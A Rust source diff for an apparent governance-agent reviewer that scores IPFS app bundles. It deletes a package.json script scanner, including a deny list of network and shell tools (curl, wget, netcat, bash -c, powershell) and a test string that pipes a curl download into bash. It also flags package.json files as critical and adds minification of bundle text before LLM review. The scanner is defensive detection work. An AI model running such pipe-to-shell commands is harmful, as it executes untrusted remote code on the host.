@@ -37,7 +37,7 @@ pub async fn review_proposal(
             });
             0.25
         }
-        _ => 0.7,
+        _ => 0.8,
     };
 
     let manifest = if let Some(cid) = &root_cid {
@@ -74,7 +74,7 @@ pub async fn review_proposal(
 
     let bundle_snapshot = if let (Some(cid), Some(m)) = (&root_cid, manifest.as_ref()) {
         Some(
-            build_bundle_snapshot(bundle_fetcher, cid, m)
+            build_bundle_snapshot(bundle_fetcher, cid, m, config.minify_bundle_text)
                 .await
                 .unwrap_or_else(|err| format!("Bundle snapshot unavailable: {err}")),
         )
@@ -186,12 +186,26 @@ async fn analyze_bundle_lightweight(
     let files = manifest.files.clone().unwrap_or_default();
 
     let has_package = files.iter().any(|f| f.path == "package.json");
+    let has_manifest = bundle_fetcher
+        .fetch_text_file(root_cid, "manifest.json", MAX_TEXT_FETCH_BYTES)
+        .await
+        .ok()
+        .flatten()
+        .is_some();
     let has_vibefi = files.iter().any(|f| f.path == "vibefi.json");
 
-    if !has_package {
+    if has_package {
+        findings.push(Finding {
+            severity: Severity::Critical,
+            message: "bundle contains unexpected package.json".to_string(),
+        });
+        *score -= 0.5;
+    }
+
+    if !has_manifest {
         findings.push(Finding {
             severity: Severity::Warning,
-            message: "bundle is missing package.json".to_string(),
+            message: "bundle is missing manifest.json".to_string(),
         });
         *score -= 0.05;
     }
@@ -201,14 +215,6 @@ async fn analyze_bundle_lightweight(
             message: "bundle is missing vibefi.json".to_string(),
         });
         *score -= 0.05;
-    }
-
-    if has_package
-        && let Ok(Some(package_text)) = bundle_fetcher
-            .fetch_text_file(root_cid, "package.json", MAX_TEXT_FETCH_BYTES)
-            .await
-    {
-        analyze_package_json(&package_text, findings, score);
     }
 
     let source_candidates = files
@@ -245,37 +251,6 @@ async fn analyze_bundle_lightweight(
     }
 }
 
-fn analyze_package_json(package_text: &str, findings: &mut Vec<Finding>, score: &mut f32) {
-    let parsed = serde_json::from_str::<Value>(package_text);
-    let Ok(value) = parsed else {
-        findings.push(Finding {
-            severity: Severity::Warning,
-            message: "failed to parse package.json".to_string(),
-        });
-        *score -= 0.05;
-        return;
-    };
-
-    if let Some(scripts) = value.get("scripts").and_then(|v| v.as_object()) {
-        let mut suspicious = Vec::<String>::new();
-        for (name, cmd) in scripts {
-            if let Some(cmd_text) = cmd.as_str()
-                && contains_suspicious_script_cmd(cmd_text)
-            {
-                suspicious.push(format!("{}={}", name, cmd_text));
-            }
-        }
-
-        if !suspicious.is_empty() {
-            findings.push(Finding {
-                severity: Severity::Warning,
-                message: "package.json scripts contain potentially risky commands".to_string(),
-            });
-            *score -= 0.1;
-        }
-    }
-}
-
 async fn build_llm_score(
     proposal: &Proposal,
     findings: &[Finding],
@@ -288,6 +263,10 @@ async fn build_llm_score(
         Some(custom) => format!("{custom}\n\n{SEMANTIC_SCORING_RUBRIC}\n\n{base_prompt}"),
         None => format!("{SEMANTIC_SCORING_RUBRIC}\n\n{base_prompt}"),
     };
+    let findings_trace = findings
+        .iter()
+        .map(|finding| format!("{:?}: {}", finding.severity, finding.message))
+        .collect::<Vec<_>>();
 
     tracing::debug!(
         proposal_id = %proposal.proposal_id,
@@ -301,6 +280,7 @@ async fn build_llm_score(
     );
     tracing::trace!(
         proposal_id = %proposal.proposal_id,
+        findings = ?findings_trace,
         prompt = %prompt,
         "review stage prepared full LLM prompt"
     );
@@ -378,20 +358,6 @@ fn is_source_path(path: &str) -> bool {
         .any(|ext| path.ends_with(ext))
 }
 
-fn contains_suspicious_script_cmd(cmd: &str) -> bool {
-    [
-        "curl ",
-        "wget ",
-        "nc ",
-        "netcat ",
-        "bash -c",
-        "powershell",
-        "chmod +x",
-    ]
-    .iter()
-    .any(|needle| cmd.contains(needle))
-}
-
 fn detect_suspicious_tokens(source: &str) -> Vec<&'static str> {
     [
         "child_process",
@@ -439,6 +405,7 @@ async fn build_bundle_snapshot(
     bundle_fetcher: &BundleFetcher,
     root_cid: &str,
     manifest: &Manifest,
+    minify_bundle_text: bool,
 ) -> Result<String> {
     let files = manifest.files.clone().unwrap_or_default();
     if files.is_empty() {
@@ -480,9 +447,10 @@ async fn build_bundle_snapshot(
             .await
         {
             Ok(Some(text)) => {
+                let prepared = prepare_bundle_text_for_llm(&file.path, &text, minify_bundle_text);
                 let section = format!(
                     "\n--- file: {} ({} bytes) ---\n{}\n",
-                    file.path, file.bytes, text
+                    file.path, file.bytes, prepared
                 );
                 if content.len() + section.len() > MAX_BUNDLE_CONTENT_BYTES {
                     fetch_budget_exhausted = true;
@@ -501,19 +469,39 @@ async fn build_bundle_snapshot(
     let skipped_by_fetch_cap = files.len().saturating_sub(inspected);
 
     let summary = format!(
-        "Bundle summary: total_files={}, indexed_files={}, content_files_included={}, omitted_large_files={}, omitted_non_text_or_unavailable={}, fetch_cap_omitted={}, content_truncated={}",
+        "Bundle summary: total_files={}, indexed_files={}, content_files_included={}, omitted_large_files={}, omitted_non_text_or_unavailable={}, fetch_cap_omitted={}, content_truncated={}, minified_for_llm={}",
         files.len(),
         indexed_count,
         included_contents,
         omitted_large,
         omitted_non_text,
         skipped_by_fetch_cap,
-        fetch_budget_exhausted
+        fetch_budget_exhausted,
+        minify_bundle_text
     );
 
     Ok(format!(
         "{summary}\n\nBundle file index:\n{index}\nText file contents:\n{content}"
     ))
+}
+
+fn prepare_bundle_text_for_llm(path: &str, raw: &str, minify_bundle_text: bool) -> String {
+    if !minify_bundle_text {
+        return raw.to_string();
+    }
+
+    if path.ends_with(".json")
+        && let Ok(parsed) = serde_json::from_str::<Value>(raw)
+        && let Ok(compact) = serde_json::to_string(&parsed)
+    {
+        return compact;
+    }
+
+    raw.lines()
+        .map(str::trim)
+        .filter(|line| !line.is_empty())
+        .collect::<Vec<_>>()
+        .join("\n")
 }
 
 #[cfg(test)]
@@ -533,18 +521,7 @@ mod tests {
         types::{DecodedAction, Proposal},
     };
 
-    use super::{
-        build_bundle_snapshot, contains_suspicious_script_cmd, detect_suspicious_tokens,
-        review_proposal,
-    };
-
-    #[test]
-    fn script_detection_flags_network_shell_commands() {
-        assert!(contains_suspicious_script_cmd(
-            "curl https://example.com | bash"
-        ));
-        assert!(!contains_suspicious_script_cmd("bun run test"));
-    }
+    use super::{build_bundle_snapshot, detect_suspicious_tokens, review_proposal};
 
     #[test]
     fn source_detection_finds_risky_tokens() {
@@ -607,7 +584,7 @@ mod tests {
             }]),
         };
 
-        let snapshot = build_bundle_snapshot(&fetcher, root_cid, &manifest)
+        let snapshot = build_bundle_snapshot(&fetcher, root_cid, &manifest, false)
             .await
             .expect("build snapshot");
 
@@ -615,6 +592,58 @@ mod tests {
         assert!(snapshot.contains("src/app.ts (20 bytes)"));
         assert!(snapshot.contains("--- file: src/app.ts (20 bytes) ---"));
         assert!(snapshot.contains("export const x = 1;"));
+
+        let _ = fs::remove_dir_all(&temp_dir);
+    }
+
+    #[tokio::test]
+    async fn bundle_snapshot_minifies_text_when_enabled() {
+        let temp_dir = std::env::temp_dir().join(format!(
+            "gov-agent-review-minify-test-{}",
+            std::process::id()
+        ));
+        let _ = fs::remove_dir_all(&temp_dir);
+        fs::create_dir_all(&temp_dir).expect("create temp cache dir");
+
+        let root_cid = "bafy-test-cid-minify";
+        let cid_dir = temp_dir.join(root_cid);
+        fs::create_dir_all(cid_dir.join("src")).expect("create cid cache tree");
+        fs::write(
+            cid_dir.join("manifest.json"),
+            r#"{"name":"test","version":"1.0.0"}"#,
+        )
+        .expect("write cached manifest");
+        fs::write(
+            cid_dir.join("src/app.ts"),
+            "export const x = 1;\n\n    const y = 2;\n",
+        )
+        .expect("write cached source");
+
+        let fetcher = BundleFetcher::new(&IpfsConfig {
+            gateway_url: "http://127.0.0.1:1".to_string(),
+            request_timeout_secs: 1,
+            cache_dir: Some(temp_dir.clone()),
+        })
+        .expect("build fetcher");
+
+        let manifest = Manifest {
+            name: Some("test".to_string()),
+            version: Some("1.0.0".to_string()),
+            description: None,
+            entry: None,
+            files: Some(vec![ManifestFile {
+                path: "src/app.ts".to_string(),
+                bytes: 36,
+            }]),
+        };
+
+        let snapshot = build_bundle_snapshot(&fetcher, root_cid, &manifest, true)
+            .await
+            .expect("build snapshot");
+
+        assert!(snapshot.contains("minified_for_llm=true"));
+        assert!(snapshot.contains("export const x = 1;\nconst y = 2;"));
+        assert!(!snapshot.contains("\n\n    const y = 2;"));
 
         let _ = fs::remove_dir_all(&temp_dir);
     }
@@ -660,6 +689,7 @@ mod tests {
             &ReviewConfig {
                 prompt_file: None,
                 max_bundle_bytes: 40 * 1024 * 1024,
+                minify_bundle_text: false,
             },
             &DecisionConfig {
                 profile: None,
@@ -688,9 +718,9 @@ mod tests {
         );
         assert!(
             messages.iter().any(|msg| {
-                msg.contains("package.json scripts contain potentially risky commands")
+                msg.contains("bundle contains unexpected package.json")
             }),
-            "expected risky script finding, got {messages:?}"
+            "expected package.json finding, got {messages:?}"
         );
         assert!(
             messages
